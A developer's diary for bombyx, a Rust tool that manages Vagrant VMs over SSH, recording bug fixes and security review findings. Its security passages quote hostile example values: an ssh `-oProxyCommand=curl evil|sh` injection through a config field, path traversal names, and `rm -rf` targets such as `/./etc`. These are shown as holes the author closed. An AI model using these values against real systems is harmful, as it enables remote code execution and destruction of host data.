# Development Diary

Development diary for bombyx. Newest entries first.

### 2026-08-10

**A doc gate, because two broken links had been sitting there**

`cargo doc` reported two broken documentation links in this repo:
`config`'s module page pointed at the private `Config::validate`,
and an xtask doc comment linked `test`, which is both a function
and an attribute macro. Neither had ever failed anything, because
rustdoc reports link problems as *warnings* — so the docs build
cleanly and quietly stop navigating.

Fixing the two links was a minute. The interesting half was that
nothing caught them, so `cargo xtask doc` now exists and runs as
the fifth `validate` gate and in the Stop hook.

It runs rustdoc **twice**, and that is the part worth writing
down, because it looks like belt-and-braces and is not. A broken
link fails in one of two ways and neither pass sees both:

- A link inside a *private* module naming something out of scope.
  The public pass never renders a private module's docs, so it
  reports nothing at all.
- A *public* page linking to a private item. That is an error in
  the public pass and perfectly legal in the private one —
  rustdoc even suggests `--document-private-items` to make it
  resolve.

I measured this rather than assuming it: breaking the link in
`doctor::text` gave 0 errors in the public pass and 2 in the
private one. Had I shipped one pass, the gate would have reported
success on a whole class it cannot see — which is the same shape
as every bug this feature produced, so it seemed worth not
repeating.

Adding the CHANGELOG entry then found a third thing: `cargo xtask
changelog add` glued a newly created `### Fixed` heading directly
onto the last bullet of the previous section, because it always
assumed a blank line above the insertion point. The skeleton the
tests used had one; a real file that ends `[Unreleased]` with a
bullet does not. A heading with no blank line above it renders as
body text. Fixed, with a test using the real-file shape.

**`bombyx doctor`, and three rounds of learning to distrust a
green result**

`bombyx up` changes state before it runs `vagrant`: it creates a
directory on the host and ships a tarball there. So a host
missing a piece reported it half-way through, and the worst case
-- `bash: vagrant: command not found` -- is one that **nothing
else can report**, because vagrant cannot tell you it is
invisible to a non-interactive shell when it is not running.
`bombyx doctor` now checks eleven things up front, changes
nothing, and runs every probe rather than stopping at the first
failure.

The feature was small. Getting it *honest* took three review
rounds, and the same mistake kept coming back in different
clothes: **a check that passes while proving less than it
claims.**

- The first libvirt check was `virsh list --all`, which for a
  non-root user silently answers from a per-user
  `qemu:///session` instance. It would have passed with no group
  membership at all.
- The login-shell probe printed `$SHELL` and passed on any zero
  exit, so a `fish` login shell -- the exact state it existed to
  catch -- reported `ok`. It now makes the shell *run* a POSIX
  construct and print a token, which is checked.
- The project-directory probe passed on a *file* named `~/vms`.
  Verified before the fix: doctor printed `all checks passed`
  and `up` then died on its first command.
- The provider probe kept only `grep`'s exit status, discarding
  vagrant's own, and matched an unanchored substring.
- The directory walk tested `-e`, which is false for a dangling
  symlink, so it stepped *past* one to a writable parent and
  passed -- while `mkdir -p` fails there with `File exists`.

So the module's governing rule is written at the top of
`doctor.rs`: a probe must carry a verdict, not a value. Where the
shell cannot decide, the verdict is applied in Rust and tested.

The second recurring shape was **hand-rolling something with
more edge cases than it looks like it has.** Four separate
findings -- executable permission bits, `PATHEXT` ordering,
quoted `PATH` entries, backtracking past a candidate that
matches by name but cannot run -- were one mistake in a
hand-written `PATH` search. The fix was to delete the search and
take the `which` crate, keeping only the decision that is
bombyx's own, expressed as a subtraction: **never search the
working directory.** On Windows the OS search includes it, and
`doctor` is the command the documentation tells you to run first
in a fresh clone -- so a repo shipping a `tar.exe` was
workstation code execution. That resolution now applies to the
push path too, and it is done up front, so a missing `tar` fails
before `up` has created anything on the host.

I made the same mistake once more while fixing it. The provider
probe's two failures (vagrant absent vs plugin absent) used to
read identically, so I composed a better message with a `tail`
subshell -- and it broke against a real host, because a `PATH`
broken enough to hide `vagrant` hides `tail` too, and the reason
came back empty. Printing the label *before* vagrant's own
output instead makes vagrant's last line the reason and needs no
extra tool. That one is worth remembering: I only found it
because I ran the failure path against frosti rather than
reasoning about it.

Which is the other lesson. Every claim in this feature that
turned out to be false was one a passing test suite had already
endorsed.

Four review rounds in total, and the last two each found a bug
inside the fix from the round before. Round three found that the
`PATH` module written to stop the working directory being searched
could still return a relative path and execute it: with no
absolute entry on `PATH` the filtered list is an empty string, and
`split_paths("")` yields one *empty* entry rather than none, which
on Unix means the working directory. Round four, scoped to only
the guards round three had rewritten, found that my new read-only
check had *regressed* against the substring version it replaced --
it stopped at `sudo` and so read `sudo mkdir -p "$d"` as
read-only -- plus a panic on non-ASCII input and a `>&file`
redirection I had wrongly classified as harmless.

So the rule I would keep from this: when a review finds that a
guard covers a sample of its input family rather than the family,
the rewrite needs its own review. Twice now the fix has been the
new bug, and both times a scoped re-review found it in one pass.

**Teardown, and a latent hole that the feature would have
turned into a weapon**

bombyx could create a persistent VM but not remove one. The
ephemeral lifecycle was symmetric -- `scratch` makes a VM and
`discard` destroys it -- while the persistent one was not:
`up` created, `down` only halted, `reset` rolled back, and
nothing removed. Tearing down the test VM from the first real
run meant abandoning bombyx and running `vagrant destroy -f`
over SSH by hand, which is exactly what the tool exists to
avoid. So `bombyx destroy <project>` now exists, and both it
and `discard` remove the VM's directory on the host once the
VM is gone. That last part makes the README's claim that
nothing survives a scratch VM true; before, the directory and
its pushed Vagrantfile stayed behind, one per discarded VM.

The interesting part was not the feature. It was what planning
the feature turned up.

Adding `rm -rf` to the command set meant looking hard at how
the target path gets built, and that surfaced something
already in the code: `remote_root` was never checked for a
`..` segment. `remote_root = "~/.."` parsed cleanly and
produced `mkdir -p ~/'../phren'`. On its own that is a
nuisance -- a directory in the wrong place. Combined with
`rm -rf` it becomes `rm -rf ~/'../igor'`, which is a home
directory. And `bombyx.toml` travels inside a project repo, so
its contents are attacker-controlled from the moment you check
out someone else's branch.

Worth naming the shape of that: the bug was already there and
was genuinely harmless. The new feature would not have
introduced it; it would have changed its severity from
cosmetic to catastrophic. A latent defect's blast radius is a
function of what else the program can do, so adding a
destructive capability means re-auditing the inputs that feed
it, not just the new code.

So the `..` rejection landed first, as its own step, with a
test that failed against the old code to prove the hole was
real. `remove_dir` then got a second, independent guard: it
refuses a target fewer than two path segments below `~` or
`/`, so even a careless `remote_root` cannot turn a teardown
into deleting a top-level directory. Two guards rather than
one, because they fail differently -- the first stops escaping
the root, the second stops the root itself being too shallow
to be safe.

Then the reviewers took the guard apart, and they were right
to. Three findings are worth keeping.

**The floor I had just added was bypassable in five
characters.** It counted textual path segments and I had
rejected `..` but not `.`. So `remote_root = "/."` with
`project = "etc"` looked two segments deep, passed, and emitted
`rm -rf '/./etc'` -- which is `rm -rf /etc`. Chaining dots
inflates the count arbitrarily. I had written a doc comment
claiming the floor stopped exactly this.

**And it was only half a guard.** The floor lived in
`remove_dir`, so the same configuration was illegal to delete
but legal to write: `remote_root = "/"` made `bombyx up` emit
`mkdir -p '/etc'` and extract a tarball into it, while
`destroy` refused to touch the same path. Overwriting `/etc` is
no better than deleting it. Both reviewers said independently
that the check belonged in `Config::validate`, and moving it
there fixed the asymmetry and removed the `Result` cascade the
guard had pushed through `remove_dir`, `tear_down`, `plan` and
`main` -- so the final version is both safer and smaller.

**The confirmation confirmed the wrong thing.** I had claimed
that typing the project name catches running `destroy` from the
wrong directory. It does not: `project` is read from the same
`bombyx.toml` that decides which directory gets deleted, so a
repo can name itself after a VM you care about, and typing the
name it chose proves nothing. `destroy` now prints the resolved
`<host>:<directory>` on both the refusal and the confirmation,
because that is the value the operator can check against
reality. The README claim was corrected rather than defended.

One more, unprompted by any hostile input: an interrupted first
push leaves a directory with no Vagrantfile, where
`vagrant destroy -f` exits non-zero forever. Since teardown
stops at the first failure, the removal never ran and no bombyx
command could clear that directory. The destroy step now skips
when there is no Vagrantfile, so teardown is re-runnable.

Verified against frosti rather than inferred: a real `destroy`
removed the domain and `~/vms/vmtest`, a real `discard` removed
`~/vms/scratch/vmtest/pr-9`, both left the parent tree intact,
and a deliberately stranded directory with no Vagrantfile was
cleared with exit 0. The three bypasses were each re-run after
the fix and now fail when the config loads.

**Making the work queue tell the truth**

Fixed the `cargo xtask todo` defect found during the first real
run, before touching anything else, on the grounds that a queue
which silently omits items is worse than no queue: every other
decision about what to do next was being made from a list that
was quietly incomplete.

The reader now accepts all three bullet spellings the file has
always contained, rather than only the two that `todo add` and
`todo done` write. `todo list` went from six entries to nine,
and three of the six it did show had summaries cut off
mid-phrase.

The truncation half turned out to be more interesting than the
original note suggested. My first guess was to rejoin the
wrapped continuation lines when reading, but that cannot work:
`add` wrote a wrapped summary with a two-space indent and wrote
the `--body` with the same two-space indent, so the second line
of a summary and the first line of a body are structurally
identical. No reader can tell them apart. The ambiguity had to
be removed at the source instead, by keeping the summary on one
line and refusing one that would not fit. That converts the
CLI's advisory "80 chars recommended" into a checked contract,
and the error names the exact budget left after the slug.

Closed the item with the repaired tool, which felt like the
right test of it.

The reviewers then found two regressions in the fix itself,
both from the same cause: replacing `wrap_markdown` with a
strict one-liner threw away two things wrapping had been doing
incidentally. First, `add --issue` builds a label carrying the
slug twice, so for an ordinary slug the label alone nearly
fills the line and the summary had a budget of zero -- a
documented flag went from working to impossible. It now uses
the same two-line shape `done` writes, label then indented
summary. Second, `wrap_markdown` split on whitespace, which
quietly collapsed newlines; the replacement did not, so a
summary containing a newline was written verbatim and spliced a
second bullet into the file. A crafted `--summary` could have
planted a phantom entry, or a colliding slug that blocks a
legitimate `add`. Interior whitespace is now collapsed before
the width is measured.

Worth noting what kind of mistake that was. Neither regression
was in the logic I was thinking about; both were in behaviour I
removed without noticing it was load-bearing. That is the
characteristic risk of replacing a general-purpose helper with
a stricter one.

**The first real run**

bombyx has now driven a real VM on a real host, end to end.
Until today everything it did was proven only by unit tests
and by `--dry-run`, which shows the argv it would execute but
says nothing about whether the far end accepts it. That gap
was the oldest open item on the list, and closing it was worth
the effort: it confirmed the fixes and it found three things
the tests could not.

Set up frosti first: Ubuntu 24.04 with QEMU, libvirt, Vagrant
2.4.9 and vagrant-libvirt 0.12.2. Two things about that are
worth remembering. Ubuntu 24.04 does not package Vagrant at
all, so it has to come from HashiCorp's repository, and
`qemu-kvm` has been renamed `qemu-system-x86`. All of it is
written up in `docs/vm-host-setup.md`.

Then ran the whole surface against a throwaway project:
`up`, `status`, `shell`, `down`, `scratch`, `discard` and
`reset`, plus a second `up` to check that pushing twice is
safe, and a deliberate `discard ../../../../etc` to see the
name validation refuse it.

**Everything the reviewers made us fix, held up.** The most
satisfying one was the tilde. The remote shell resolved
`~/'vms/vmtest'` to `/home/igor/vms/vmtest`, and no directory
literally named `~` was created anywhere. That was the bug
that 82 unit tests had asserted *into* place, so seeing the
corrected form work against a real shell is the clearest
possible answer to why a real run was needed.

The rest of the push behaved as designed. After two pushes the
`Vagrantfile` sat directly in `~/vms/vmtest/`, with no nested
`vagrant/` directory, so the `scp -r` nesting problem is
genuinely gone. The VM's `.vagrant` identity directory
survived the second push with its domain id intact, which is
the `--exclude=./.vagrant` fix working. No push archive was
left behind on either end. Scratch VMs landed in
`~/vms/scratch/vmtest/pr-1234`, scoped by project as intended.
Exit codes propagated: `status` against a directory that did
not exist returned 1 and named the command that failed.

Vagrant's own log gave the neatest confirmation that the seam
works, describing the domain it built as
`Source: /home/igor/vms/vmtest/Vagrantfile` -- the file bombyx
had pushed, in the directory bombyx had created. And
`bombyx shell` reached all the way inside, printing
`vmtest / vagrant / 6.8.0-136-generic` from the guest.

**Three findings.** `discard` destroys the VM but leaves the
scratch directory sitting on the host, which makes the
README's claim that "nothing survives" untrue as written.
`reset` restores a snapshot called `fresh-install` that no
bombyx command ever creates, so on a new project it can only
fail -- it does fail cleanly, but the workflow has a hole in
it. Both are captured.

The third is more embarrassing and more useful.
`cargo xtask todo` writes entries as `**slug**` but its reader
only recognises that same bold form, and the four
hand-written entries in `docs/todo.md` use backticks instead.
So `todo list` has been silently omitting them since the day
they were written, `todo done first-real-run` could not find
the very item this work closed, and I reported that truncated
list as complete more than once without noticing it disagreed
with the file.

That is the same shape as the tilde bug and as the libvirt
check I wrote earlier today, which passed by connecting to a
per-user libvirt instance rather than the system one and so
proved nothing. Three times in two days, the failure was not
a red result. It was a green one that did not mean what it
appeared to mean.

### 2026-08-09

**Dropping the frontend tooling, and the npm awareness
behind it**

The CLI-only prune removed the web crate, the frontend and
the E2E suite, but left every piece of tooling that served
them: five `xtask` frontend modules, two dev-server shell
scripts, and a set of `.gitignore` blocks for Playwright and
Node. None of it could run -- there was nothing to point it
at -- so it was pure carrying cost, and `/template-sync` had
to reconcile all of it on every future sync.

Deleting that much is easy. The interesting part was the
second decision: whether the *npm awareness* in the tooling
that survived should go too. `cargo xtask audit` ran
`npm audit` only when `frontend/package.json` existed, and
the dependency-cooldown gate watched a
`frontend/package-lock.json` that will never appear. Both
already degraded cleanly to nothing. Keeping them cost
nothing at runtime; removing them meant deleting ~400 lines
of working, tested code.

Chose to remove. A half-supported second ecosystem is worse
than none: it reads as a capability the project has, and the
next person to touch `dep-age` would have to understand and
maintain a code path that cannot fire. `xtask` is now
Rust-only end to end -- `audit.rs` lost `NpmAudit` and its
runner, `dep_age.rs` lost `npm_version_date` / `npm_versions`
and the registry arm, and `gate.rs` lost `parse_npm_lock` and
its lockfile entry.

`Ecosystem` survives as a **single-variant enum**, and the
`cargo` argument stays on the command line
(`dep-age cargo serde`). That is deliberate: it keeps the
command stable and means adding a second registry later
needs no CLI change. It costs a one-armed `match` in three
places, which is the honest price of that option.

The one real trap was in `sync.rs`. Its `categorize` function
lists `frontend/` and `e2e/` as boilerplate prefixes, and
deleting them looks exactly as correct as everything else in
this change. It would have been wrong: those prefixes
classify paths in the **upstream rustbase diff**, which still
has a frontend, so removing them would silently drop upstream
frontend changes into the wrong bucket during
`/template-sync`. Left in place with a comment saying why,
since the next cleanup pass will be tempted the same way.

Verified the survivors against the live registry rather than
trusting the suite: `dep-age cargo serde` resolves and dates
correctly, `--latest-aged` still prints a pin target, `audit`
reports without an npm segment, `dep-age-check` is a clean
no-op, and `dep-age npm vite` now fails at the CLI boundary
with `invalid value 'npm' [possible values: cargo]` rather
than panicking.

Net: 784 lines deleted, and `cargo xtask --help` no longer
advertises four commands that could not work.

**Initial scaffold: a thin SSH control plane for agent VMs**

Started bombyx from the
[rustbase](https://github.com/breki/rustbase) template at
`f40582f` (v0.17.0), pruned to a CLI-only project -- the
template's web crate, frontend, E2E suite and deploy
subsystem are all gone, since bombyx has no runtime
services.

The shape of the tool follows from one decision: **the repo
is the source of truth, and the VM host holds only a
cache**. Each project keeps its `vagrant/` directory in its
own repo; `bombyx up` pushes it to the host and then runs
`vagrant` there over SSH. The host can therefore never
silently drift from the repo, and there is no state on the
host worth backing up.

The second decision is **wrap, don't reimplement**. bombyx
composes `ssh`, `scp`, `tar` and `vagrant` and nothing more.
If it breaks, `ssh frosti` and `vagrant up` by hand still
work -- which matters for a tool whose job is to be the only
thing standing between an agent and your credentials.

Four modules carry the work:

- `config.rs` parses `bombyx.toml` into typed `thiserror`
  errors and resolves the remote paths.
- `name.rs` holds `ScratchName`, a validated single path
  segment.
- `remote.rs` builds the command lines. Nothing here spawns
  a process: every function returns the argv to run.
- `plan.rs` maps an `Action` to the ordered command list.

Keeping the command construction pure is what makes
`--dry-run` trustworthy enough to develop against, and it is
why `plan.rs` lives in the library rather than in
`src/bin/` -- the project excludes `src/bin/` from coverage,
so policy sitting there would ship untested.

**The push mechanism took two attempts.** The obvious
`scp -r vagrant host:~/vms/phren/` is wrong, and wrong in a
way that only shows up on the *second* run: `scp -r` copies
*into* an existing destination, like `cp -r`. The first push
creates `~/vms/phren/vagrant`; the second creates
`~/vms/phren/vagrant/vagrant`, one level deeper every time.
Replaced it with a tar round-trip -- `tar -czf <a> -C <dir>
.` locally, `scp` the archive, then extract on the host. The
`-C <dir> .` is the load-bearing part: it archives the
directory's *contents*, so extraction lands files directly
in the target and repeated pushes overwrite in place.

`rsync` would have solved this more cleanly, and was
rejected on one ground: it is not present on a stock Windows
workstation, which is exactly where bombyx runs.

A related bug fell out of the same pass: `up` pushed to one
directory but ran `vagrant` in another, and `scratch` never
pushed at all, so it ran `vagrant up` in an empty directory,
guaranteed. Both now go through a shared `boot` helper.

**Then the reviewers took the scaffold apart.** Two
read-only agents (a security/correctness pass and a
craftsmanship pass) reviewed the initial commit and returned
23 findings between them, four of which they raised
independently. Enough of them were real, and load-bearing,
that fixing them before the first commit was the only honest
option. The ones worth recording:

*The default configuration did not work.* Every remote path
was single-quoted for safety, including the default
`remote_root = "~/vms"`. A POSIX shell does not expand `~`
inside single quotes, so `mkdir -p '~/vms/phren'` created a
directory *literally named* `~` under the login directory.
Meanwhile the `scp` destination interpolated the same path
unquoted, where `~` *does* expand -- so the archive landed
in the real `$HOME/vms/phren` while `vagrant up` ran in the
bogus tree with no Vagrantfile. Worse, the tests asserted
the quoted form, so they locked the bug in. The fix is
`quote_remote_path`, which leaves only the tilde outside the
quotes: `~/'vms/phren'`. Everything an attacker could
influence stays quoted, and the shell still expands the home
directory.

That one is the cleanest illustration of why the project's
Definition of Done requires a real VM host: the argv was
provably correct and provably useless.

*Two ways a cloned repo could run code on the workstation.*
`host` was passed as the first positional argument to `ssh`,
which has no `--` separator -- so a repo shipping `host =
"-oProxyCommand=curl evil|sh"` would execute that on *your
machine*, from a bare `bombyx status`, before any network
traffic. And the `scp` destination was the one path in the
module that skipped quoting entirely. Since `bombyx.toml`
travels inside a repo, it is attacker-controlled data the
moment you check out someone else's branch. Both are now
closed by allowlist validation in `Config::validate`. For a
tool whose entire purpose is containing untrusted code,
shipping either would have been embarrassing.

*Quoting is not validation.* The `scratch <name>` argument
was correctly quoted and still a traversal: `'../../../../etc'`
is a perfectly valid quoted string that still means `/etc`,
and the next step extracts a tar over it. `ScratchName` now
makes the safe shape a parsing step, so an invalid name
cannot reach a path at all. Related: scratch directories
omitted the project name, so `scratch pr-1` from two
projects resolved to the same directory on the host.

*The push clobbered the thing it promised not to.* The doc
comment and the README both stated that `.vagrant/` on the
host is left alone. But `tar -C <dir> .` includes dotfiles,
so a developer who had ever run `vagrant` locally shipped
their own `.vagrant/` and overwrote the host's machine
identity, orphaning the running VM. Now excluded explicitly,
with a test.

*Windows, the primary platform.* `std::env::temp_dir()`
returns `C:\Users\...`, and `scp` reads everything before
the first colon as a host name -- so `up` would have tried
to connect to a host called `C`. The archive now keeps a
bare file name and `tar`/`scp` run *in* its directory.

The remaining fixes were smaller: a fixed temp-file name
replaced by a per-run private directory (a co-user could
pre-create the path; two concurrent runs raced; and
`--dry-run` deleted the file, so a flag documented as
"print, don't run" had a destructive side effect); `&&`-
chained remote cleanup that skipped on failure and left a
corrupt archive in the boot directory; remote exit codes
flattened to 1; `deny_unknown_fields` so a typo'd key is
reported instead of silently defaulting; and a batch of
loose `contains`/`starts_with` assertions replaced by
full-value and ordering checks, which is what let several of
these through in the first place.

Ended at 96 tests and 100% coverage.

**Status:** the command surface works and is well covered,
but it *still* has not been driven against a real VM host.
`--dry-run` proves the argv, and this session is a good
lesson in how little that guarantees. That verification is
the next step and is required before any of this can be
called done.
